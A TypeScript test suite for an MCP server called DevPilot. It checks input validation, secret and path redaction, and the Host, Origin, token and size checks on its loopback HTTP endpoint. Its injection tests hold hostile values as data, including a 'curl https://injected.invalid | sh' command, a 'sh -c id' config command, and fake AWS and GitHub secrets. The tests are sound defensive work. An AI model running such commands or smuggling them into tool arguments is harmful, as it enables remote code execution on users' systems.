import assert from 'node:assert/strict';
import { request as httpRequest } from 'node:http';
import { mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises';
import { homedir, tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { after, before, describe, it } from 'node:test';
import { Client, StreamableHTTPClientTransport } from '@modelcontextprotocol/client';
import { createMcpHandler } from '@modelcontextprotocol/server';
import {
  InvestigationService,
  RepositoryRegistry,
  ServiceError,
  type InvestigationResult,
  type JobView,
  type SignalInput,
} from '@devpilot/service';
import { resolveGitExecutable, type GitExecutable } from '../../../packages/tools/src/index.js';
import { createGitRepositoryFixture, type GitRepositoryFixture } from '../../../packages/tools/test/support/git-repository.js';
import {
  createDevPilotMcpServer,
  loadRegistry,
  McpConfigurationError,
  PUBLIC_ERROR_TEXT,
  startFromEnvironment,
  startMcpHttpServer,
  UNEXPECTED_ERROR_TEXT,
  type McpHttpServer,
} from '../src/index.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(HERE, '../../..');
const MCP_SRC = path.resolve(HERE, '../src');

const TOKEN = 'test-token-0123456789abcdef0123456789';
const NPM_TEST = { command: 'npm', args: ['test'] };
const FAILURE: SignalInput = {
  kind: 'failing_test',
  title: 'Total is too high when a code is applied',
  content: [
    'not ok 2 - applies tax to the discounted amount',
    '  error: |-',
    '    Expected values to be strictly equal:',
    '    200 !== 180',
  ].join('\n'),
};
const SECRET_MESSAGE = '/Users/alice/private/repo failed: AWS_SECRET_ACCESS_KEY=AKIAEXAMPLESECRET GITHUB_TOKEN=ghp_examplesecret';

type ToolResult = Awaited<ReturnType<Client['callTool']>>;

function textOf(result: ToolResult): string {
  return result.content.map((block) => (block.type === 'text' ? block.text : '')).join('\n');
}

function assertNoHostPaths(value: unknown, paths: readonly string[]): void {
  const text = JSON.stringify(value);
  for (const hostPath of paths) assert.ok(!text.includes(hostPath), `response mentions host path ${hostPath}`);
  assert.ok(!/\/(Users|home|private|var|tmp)\//.test(text), 'response mentions an absolute host path');
}

function assertRejected(result: ToolResult, ...forbidden: string[]): void {
  assert.equal(result.isError, true);
  assert.equal(result.structuredContent, undefined);
  const text = textOf(result);
  for (const value of forbidden) assert.ok(!text.includes(value), `error text echoes ${value}`);
}

async function inProcessClient(service: InvestigationService, onUnexpectedError?: (error: unknown) => void) {
  const handler = createMcpHandler(() => createDevPilotMcpServer(service, onUnexpectedError ? { onUnexpectedError } : {}), {
    responseMode: 'json',
  });
  const client = new Client({ name: 'devpilot-test', version: '1.0.0' }, { versionNegotiation: { mode: 'auto' } });
  await client.connect(
    new StreamableHTTPClientTransport(new URL('http://test.local/mcp'), { fetch: (url, init) => handler.fetch(new Request(url, init)) }),
  );
  return {
    client,
    close: async () => {
      await client.close();
      await handler.close();
    },
  };
}

async function httpClient(server: McpHttpServer, modern: boolean, token = TOKEN): Promise<Client> {
  const client = new Client({ name: 'devpilot-test', version: '1.0.0' }, modern ? { versionNegotiation: { mode: 'auto' } } : {});
  await client.connect(
    new StreamableHTTPClientTransport(server.url, { requestInit: { headers: { authorization: `Bearer ${token}` } } }),
  );
  return client;
}

interface RawResponse {
  readonly status: number;
  readonly headers: Record<string, string | string[] | undefined>;
  readonly body: string;
}

function raw(url: URL, options: { method?: string; path?: string; headers?: Record<string, string>; body?: string | Buffer }): Promise<RawResponse> {
  return new Promise((resolve, reject) => {
    const request = httpRequest(
      { host: url.hostname, port: url.port, method: options.method ?? 'POST', path: options.path ?? url.pathname, headers: options.headers ?? {} },
      (response) => {
        const chunks: Buffer[] = [];
        response.on('data', (chunk: Buffer) => chunks.push(chunk));
        response.on('end', () => resolve({ status: response.statusCode ?? 0, headers: response.headers, body: Buffer.concat(chunks).toString('utf8') }));
      },
    );
    request.on('error', (error: NodeJS.ErrnoException) => {
      if (error.code === 'ECONNRESET' || error.code === 'EPIPE') resolve({ status: -1, headers: {}, body: '' });
      else reject(error);
    });
    if (options.body !== undefined) request.end(options.body);
    else request.end();
  });
}

const LEGACY_INITIALIZE = JSON.stringify({
  jsonrpc: '2.0',
  id: 1,
  method: 'initialize',
  params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'raw', version: '1.0.0' } },
});

function mcpHeaders(url: URL, extra: Record<string, string> = {}): Record<string, string> {
  return {
    host: url.host,
    'content-type': 'application/json',
    accept: 'application/json, text/event-stream',
    authorization: `Bearer ${TOKEN}`,
    ...extra,
  };
}

function throwingService(error: unknown): InvestigationService {
  const fail = (): never => {
    throw error;
  };
  return { listRepositories: fail, startInvestigation: fail, getResult: fail, getJob: fail, waitForJob: fail } as unknown as InvestigationService;
}

describe('MCP tools over the SDK, in process', () => {
  const registry = new RepositoryRegistry();
  registry.register({ repositoryId: 'shop', displayName: 'Shop', repositoryRoot: path.join(tmpdir(), 'devpilot-mcp-unused', 'repo'), verification: NPM_TEST });
  const service = new InvestigationService({ registry });
  let session: Awaited<ReturnType<typeof inProcessClient>>;

  before(async () => {
    session = await inProcessClient(service);
  });

  after(async () => {
    await session?.close();
  });

  it('negotiates the modern protocol era and lists exactly the three tools', async () => {
    assert.equal(session.client.getProtocolEra(), 'modern');
    const { tools } = await session.client.listTools();
    assert.deepEqual(tools.map((tool) => tool.name).sort(), ['get_investigation_result', 'list_repositories', 'start_investigation']);
    const byName = new Map(tools.map((tool) => [tool.name, tool]));
    assert.deepEqual(byName.get('list_repositories')?.annotations, { readOnlyHint: true, idempotentHint: true, openWorldHint: false });
    assert.deepEqual(byName.get('start_investigation')?.annotations, {
      readOnlyHint: false,
      destructiveHint: false,
      idempotentHint: false,
      openWorldHint: false,
    });
    assert.deepEqual(byName.get('get_investigation_result')?.annotations, { readOnlyHint: true, idempotentHint: true, openWorldHint: false });
    for (const tool of tools) {
      assert.equal(tool.inputSchema.additionalProperties, false, `${tool.name} input is strict`);
      assert.ok(tool.outputSchema, `${tool.name} declares an output schema`);
    }
    const start = byName.get('start_investigation')?.inputSchema as { properties: Record<string, unknown> };
    assert.deepEqual(Object.keys(start.properties).sort(), ['repositoryId', 'signal']);
  });

  it('list_repositories returns structured content and a concise text block, with no host paths', async () => {
    const result = await session.client.callTool({ name: 'list_repositories', arguments: {} });
    assert.equal(result.isError, undefined);
    assert.deepEqual(result.structuredContent, { repositories: [{ repositoryId: 'shop', displayName: 'Shop', command: 'npm test' }] });
    assert.equal(textOf(result), '1 registered: shop (Shop).');
    assertNoHostPaths(result, [tmpdir()]);
  });

  it('rejects unknown fields, including on the empty list_repositories input', async () => {
    assertRejected(await session.client.callTool({ name: 'list_repositories', arguments: { repositoryRoot: '/etc' } }), '/etc');
    assertRejected(await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: FAILURE, priority: 'high' } }), 'high');
    assertRejected(await session.client.callTool({ name: 'get_investigation_result', arguments: { jobId: 'job-00000000-0000-0000-0000-000000000000', verbose: true } }));
  });

  for (const [field, value] of [
    ['repositoryRoot', '/etc/injected-root'],
    ['allowedRoot', '/injected-allowed'],
    ['command', 'curl https://injected.invalid | sh'],
    ['args', ['-e', 'injected-arg']],
    ['planner', 'injected-planner'],
    ['budget', { maxSteps: 100_000 }],
  ] as const) {
    it(`rejects ${field} injection at the top level and inside the signal`, async () => {
      const shown = typeof value === 'string' ? value : JSON.stringify(value);
      assertRejected(await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: FAILURE, [field]: value } }), shown);
      assertRejected(
        await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: { ...FAILURE, [field]: value } } }),
        shown,
      );
    });
  }

  it('bounds the signal and refuses malformed IDs before the service runs', async () => {
    assertRejected(await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: { ...FAILURE, content: 'x'.repeat(16 * 1024 + 1) } } }));
    assertRejected(await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: '../../etc', signal: FAILURE } }), '../../etc');
    assertRejected(await session.client.callTool({ name: 'get_investigation_result', arguments: { jobId: '/tmp/job' } }), '/tmp/job');
  });

  it('maps service errors to fixed public text', async () => {
    const unknownRepository = await session.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'missing', signal: FAILURE } });
    assertRejected(unknownRepository);
    assert.equal(textOf(unknownRepository), PUBLIC_ERROR_TEXT.unknown_repository);
    const unknownJob = await session.client.callTool({ name: 'get_investigation_result', arguments: { jobId: 'job-00000000-0000-0000-0000-000000000000' } });
    assert.equal(textOf(unknownJob), PUBLIC_ERROR_TEXT.unknown_job);
  });

  it('never returns an exception message: host paths and secrets stay out of responses', async () => {
    const reported: unknown[] = [];
    for (const error of [new Error(SECRET_MESSAGE), new ServiceError('repository_busy', SECRET_MESSAGE), new TypeError(SECRET_MESSAGE), SECRET_MESSAGE]) {
      const broken = await inProcessClient(throwingService(error), (unexpected) => reported.push(unexpected));
      try {
        const responses = [
          await broken.client.callTool({ name: 'list_repositories', arguments: {} }),
          await broken.client.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: FAILURE } }),
          await broken.client.callTool({ name: 'get_investigation_result', arguments: { jobId: 'job-00000000-0000-0000-0000-000000000000' } }),
        ];
        for (const response of responses) {
          assertRejected(response, '/Users/alice', 'AWS_SECRET_ACCESS_KEY', 'AKIAEXAMPLESECRET', 'ghp_examplesecret');
          assert.equal(textOf(response), error instanceof ServiceError ? PUBLIC_ERROR_TEXT.repository_busy : UNEXPECTED_ERROR_TEXT);
        }
      } finally {
        await broken.close();
      }
    }
    assert.equal(reported.length, 9, 'unexpected errors are reported server-side; ServiceErrors are not');
  });
});

describe('MCP over a real loopback socket', () => {
  let realGit: GitExecutable;
  let shop: GitRepositoryFixture;
  let server: McpHttpServer;
  let modern: Client;
  let legacy: Client;
  let started: JobView;
  let busy: ToolResult;
  let finished: InvestigationResult;
  let legacyView: ToolResult;
  const responses: unknown[] = [];
  const serverErrors: unknown[] = [];
  let hostPaths: string[];

  before(async () => {
    realGit = await resolveGitExecutable();
    shop = await createGitRepositoryFixture(realGit);
    hostPaths = [shop.base, shop.root, shop.canonicalRoot, shop.allowedRoot, homedir(), tmpdir()];
    const registry = new RepositoryRegistry();
    registry.register({ repositoryId: 'shop', displayName: 'Shop', repositoryRoot: shop.root, allowedRoot: shop.allowedRoot, verification: NPM_TEST });
    const service = new InvestigationService({ registry, git: realGit });
    server = await startMcpHttpServer({
      service,
      port: 0,
      token: TOKEN,
      allowedOrigins: ['http://localhost:6274'],
      onError: (error) => serverErrors.push(error),
    });

    modern = await httpClient(server, true);
    responses.push(await modern.callTool({ name: 'list_repositories', arguments: {} }));
    const start = await modern.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: FAILURE } });
    responses.push(start);
    started = start.structuredContent as JobView;
    busy = await modern.callTool({ name: 'start_investigation', arguments: { repositoryId: 'shop', signal: FAILURE } });

    const deadline = Date.now() + 120_000;
    for (;;) {
      const poll = await modern.callTool({ name: 'get_investigation_result', arguments: { jobId: started.jobId } });
      responses.push(poll);
      const result = poll.structuredContent as InvestigationResult;
      if (result.job.status === 'completed' || result.job.status === 'failed') {
        finished = result;
        break;
      }
      if (Date.now() > deadline) throw new Error('The investigation did not finish in time');
      await new Promise((resolve) => setTimeout(resolve, 100));
    }

    legacy = await httpClient(server, false);
    legacyView = await legacy.callTool({ name: 'get_investigation_result', arguments: { jobId: started.jobId } });
    responses.push(legacyView, await legacy.callTool({ name: 'list_repositories', arguments: {} }));
  });

  after(async () => {
    await modern?.close();
    await legacy?.close();
    await server?.close();
    await shop?.cleanup();
  });

  it('binds to 127.0.0.1 and serves /mcp', () => {
    assert.equal(server.url.hostname, '127.0.0.1');
    assert.equal(server.url.pathname, '/mcp');
  });

  it('a modern client lists repositories, starts an investigation, and polls it to completion', () => {
    assert.equal(modern.getProtocolEra(), 'modern');
    assert.deepEqual((responses[0] as ToolResult).structuredContent, {
      repositories: [{ repositoryId: 'shop', displayName: 'Shop', command: 'npm test' }],
    });
    assert.equal(started.status, 'queued');
    assert.match(started.jobId, /^job-[0-9a-f-]{36}$/);
    assert.equal(finished.job.status, 'completed', finished.job.failureReason);
  });

  it('maps a concurrent start for the same repository to the fixed busy text', () => {
    assert.equal(busy.isError, true);
    assert.equal(textOf(busy), PUBLIC_ERROR_TEXT.repository_busy);
  });

  it('returns the grounded result as structured content with the spoken summary as text', () => {
    const outcome = finished.outcome;
    assert.ok(outcome);
    assert.equal(outcome.groundingValid, true);
    assert.equal(outcome.repairStatus, 'repaired');
    assert.deepEqual(outcome.baselineFailures.map((failure) => failure.testName), ['applies tax to the discounted amount']);
    assert.ok(outcome.claims.some((claim) => claim.kind === 'verification'));
    assert.equal(textOf(responses.at(-3) as ToolResult), outcome.spokenSummary);
  });

  it('a legacy (2025 handshake) client reads the same job: one service instance serves every request', () => {
    assert.equal(legacy.getProtocolEra(), 'legacy');
    assert.equal(legacyView.isError, undefined);
    assert.deepEqual(legacyView.structuredContent, finished);
  });

  it('no response mentions a host path or the token', () => {
    for (const response of [...responses, busy]) {
      assertNoHostPaths(response, hostPaths);
      assert.ok(!JSON.stringify(response).includes(TOKEN));
    }
    assert.deepEqual(serverErrors, []);
  });

  describe('raw HTTP security checks', () => {
    it('wrong path -> 404, before any other check', async () => {
      const response = await raw(server.url, { path: '/other', headers: { host: 'evil.example' } });
      assert.equal(response.status, 404);
      assert.equal((await raw(server.url, { path: '/mcp/extra', headers: mcpHeaders(server.url) })).status, 404);
    });

    it('wrong method -> 405 with Allow: POST', async () => {
      for (const method of ['GET', 'DELETE', 'PUT']) {
        const response = await raw(server.url, { method, headers: mcpHeaders(server.url) });
        assert.equal(response.status, 405, method);
        assert.equal(response.headers.allow, 'POST');
      }
    });

    it('invalid Host -> 403, before authentication', async () => {
      for (const host of ['evil.example', `evil.example:${server.url.port}`, '127.0.0.1.nip.io']) {
        const response = await raw(server.url, { headers: { ...mcpHeaders(server.url), host }, body: LEGACY_INITIALIZE });
        assert.equal(response.status, 403, host);
        const unauthenticated = await raw(server.url, { headers: { host, 'content-type': 'application/json' }, body: LEGACY_INITIALIZE });
        assert.equal(unauthenticated.status, 403, `${host} without a token`);
      }
    });

    it('foreign Origin -> 403; an allowlisted origin and a missing Origin pass', async () => {
      for (const origin of ['http://evil.example', 'http://localhost:9999', `http://127.0.0.1:${server.url.port}`, 'null', 'not a url']) {
        const response = await raw(server.url, { headers: mcpHeaders(server.url, { origin }), body: LEGACY_INITIALIZE });
        assert.equal(response.status, 403, origin);
      }
      assert.equal((await raw(server.url, { headers: mcpHeaders(server.url, { origin: 'http://localhost:6274' }), body: LEGACY_INITIALIZE })).status, 200);
      assert.equal((await raw(server.url, { headers: mcpHeaders(server.url), body: LEGACY_INITIALIZE })).status, 200);
    });

    it('missing token -> 401 with a Bearer challenge', async () => {
      const { authorization: _omitted, ...headers } = mcpHeaders(server.url);
      const response = await raw(server.url, { headers, body: LEGACY_INITIALIZE });
      assert.equal(response.status, 401);
      assert.equal(response.headers['www-authenticate'], 'Bearer');
    });

    it('wrong or malformed token -> 401 with an invalid_token challenge', async () => {
      for (const authorization of [`Bearer ${TOKEN}x`, `Bearer ${TOKEN.slice(0, -1)}`, 'Bearer ', `Basic ${TOKEN}`, TOKEN, `Bearer ${TOKEN} extra`]) {
        const response = await raw(server.url, { headers: mcpHeaders(server.url, { authorization }), body: LEGACY_INITIALIZE });
        assert.equal(response.status, 401, authorization);
        assert.equal(response.headers['www-authenticate'], 'Bearer error="invalid_token"');
        assert.ok(!response.body.includes(TOKEN));
      }
      assert.equal((await raw(server.url, { headers: mcpHeaders(server.url, { authorization: `bearer ${TOKEN}` }), body: LEGACY_INITIALIZE })).status, 200);
    });

    it('oversized body -> 413', async () => {
      const oversized = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list', params: { padding: 'x'.repeat(129 * 1024) } });
      const response = await raw(server.url, { headers: mcpHeaders(server.url), body: oversized });
      assert.ok(response.status === 413 || response.status === -1, `status ${response.status}`);
      const declared = await raw(server.url, { headers: mcpHeaders(server.url, { 'content-length': String(200 * 1024) }), body: Buffer.alloc(0) });
      assert.ok(declared.status === 413 || declared.status === -1, `declared status ${declared.status}`);
    });

    it('wrong content type -> 415', async () => {
      const response = await raw(server.url, { headers: mcpHeaders(server.url, { 'content-type': 'text/plain' }), body: LEGACY_INITIALIZE });
      assert.equal(response.status, 415);
    });

    it('rejections carry no internal details', async () => {
      const probes = await Promise.all([
        raw(server.url, { path: '/nope', headers: mcpHeaders(server.url) }),
        raw(server.url, { method: 'GET', headers: mcpHeaders(server.url) }),
        raw(server.url, { headers: { ...mcpHeaders(server.url), host: 'evil.example' }, body: '{}' }),
        raw(server.url, { headers: mcpHeaders(server.url, { origin: 'http://evil.example' }), body: '{}' }),
        raw(server.url, { headers: mcpHeaders(server.url, { authorization: 'Bearer wrong' }), body: '{}' }),
        raw(server.url, { headers: mcpHeaders(server.url, { 'content-type': 'text/plain' }), body: '{}' }),
      ]);
      for (const probe of probes) {
        assertNoHostPaths(probe.body, hostPaths);
        assert.ok(!probe.body.includes(TOKEN));
        assert.ok(!/at .+:\d+:\d+|Error:/.test(probe.body), probe.body);
      }
    });
  });
});

describe('startup and configuration', () => {
  let workspace: string;

  before(async () => {
    workspace = await mkdtemp(path.join(tmpdir(), 'devpilot-mcp-config-'));
  });

  after(async () => {
    await rm(workspace, { recursive: true, force: true });
  });

  const writeConfig = async (name: string, config: unknown) => {
    const file = path.join(workspace, name);
    await writeFile(file, JSON.stringify(config));
    return file;
  };

  it('refuses to start without a token', async () => {
    await assert.rejects(startFromEnvironment({ DEVPILOT_MCP_CONFIG: path.join(workspace, 'none.json') }), (error: unknown) => {
      return error instanceof McpConfigurationError && error.message === 'DEVPILOT_MCP_TOKEN is required';
    });
    const service = new InvestigationService({ registry: new RepositoryRegistry() });
    for (const token of ['', 'short']) {
      await assert.rejects(startMcpHttpServer({ service, port: 0, token }), McpConfigurationError);
    }
  });

  it('builds the registry from the server-side configuration, resolving relative roots', async () => {
    const file = await writeConfig('ok.json', {
      repositories: [{ repositoryId: 'local', displayName: 'Local', repositoryRoot: 'repos/local', verification: NPM_TEST, defaultSignal: FAILURE }],
    });
    const registry = await loadRegistry(file);
    assert.deepEqual(registry.list(), [{ repositoryId: 'local', displayName: 'Local', command: 'npm test' }]);
    assert.equal(registry.resolve('local')?.repositoryRoot, path.join(workspace, 'repos/local'));
  });

  it('refuses malformed configuration and disallowed commands', async () => {
    const cases = [
      { repositories: [], extra: true },
      { repos: [] },
      { repositories: ['shop'] },
      { repositories: [{ repositoryId: 'x', displayName: 'X', repositoryRoot: 'r', verification: { command: 'sh', args: ['-c', 'id'] } }] },
      { repositories: [{ repositoryId: 'x', displayName: 'X', repositoryRoot: 'r', verification: NPM_TEST, planner: 'other' }] },
    ];
    for (const [index, config] of cases.entries()) {
      await assert.rejects(loadRegistry(await writeConfig(`bad-${index}.json`, config)), McpConfigurationError, JSON.stringify(config));
    }
  });

  it('starts from the environment on loopback and closes cleanly', async () => {
    const file = await writeConfig('env.json', { repositories: [] });
    const server = await startFromEnvironment({ DEVPILOT_MCP_TOKEN: TOKEN, DEVPILOT_MCP_CONFIG: file, DEVPILOT_MCP_PORT: '0' });
    try {
      assert.equal(server.url.hostname, '127.0.0.1');
      const client = await httpClient(server, true);
      const listed = await client.callTool({ name: 'list_repositories', arguments: {} });
      assert.deepEqual(listed.structuredContent, { repositories: [] });
      await client.close();
    } finally {
      await server.close();
    }
  });
});

describe('source boundaries', () => {
  const MCP_ALLOWED = /^(node:[a-z/]+|@modelcontextprotocol\/(server|node)|@devpilot\/service|\.\/[a-z-]+\.js)$/;
  const MCP_FORBIDDEN =
    /@devpilot\/(engine|tools|core|planners)|RepairWorkflow|InvestigationEngine|GroundedRepairPipeline|apply_patch|run_command|RepositorySandbox|child_process|@modelcontextprotocol\/sdk|StreamableHTTPServerTransport|sessionIdGenerator|server\.tool\(|express|hono|aws|bedrock|alexa/i;

  async function sources(directory: string): Promise<Array<[string, string]>> {
    const files = (await readdir(directory, { recursive: true })).filter((file) => file.endsWith('.ts'));
    return Promise.all(files.map(async (file) => [file, await readFile(path.join(directory, file), 'utf8')] as [string, string]));
  }

  it('apps/mcp imports only the MCP SDK, the service, and node built-ins, and never the engine or tools', async () => {
    const files = await sources(MCP_SRC);
    assert.deepEqual(files.map(([file]) => file).sort(), ['http.ts', 'index.ts', 'server.ts']);
    for (const [file, source] of files) {
      for (const [, specifier] of source.matchAll(/from '([^']+)'/g)) assert.match(specifier ?? '', MCP_ALLOWED, `${file} imports ${specifier}`);
      assert.ok(!MCP_FORBIDDEN.test(source), `${file} references ${source.match(MCP_FORBIDDEN)?.[0]}`);
    }
  });

  it('the service is constructed exactly once, in index.ts, and the handler factory captures it', async () => {
    const files = await sources(MCP_SRC);
    const constructions = files.flatMap(([file, source]) => [...source.matchAll(/new InvestigationService\(/g)].map(() => file));
    assert.deepEqual(constructions, ['index.ts']);
    const http = files.find(([file]) => file === 'http.ts')?.[1] ?? '';
    assert.match(http, /createMcpHandler\(\(\) => createDevPilotMcpServer\(service,/);
  });

  it('only apps/mcp imports the MCP SDK; packages/service stays protocol-, HTTP-, and cloud-free', async () => {
    const roots = ['packages/core/src', 'packages/tools/src', 'packages/planners/src', 'packages/engine/src', 'packages/eval/src', 'packages/service/src', 'apps/cli/src', 'tests'];
    for (const root of roots) {
      for (const [file, source] of await sources(path.join(REPO_ROOT, root))) {
        assert.ok(!source.includes('@modelcontextprotocol'), `${root}/${file} imports the MCP SDK`);
      }
    }
    for (const [file, source] of await sources(path.join(REPO_ROOT, 'packages/service/src'))) {
      assert.ok(!/node:http|node:net|express|hono|@aws-sdk|bedrock|alexa/i.test(source), `packages/service/src/${file}`);
    }
  });
});
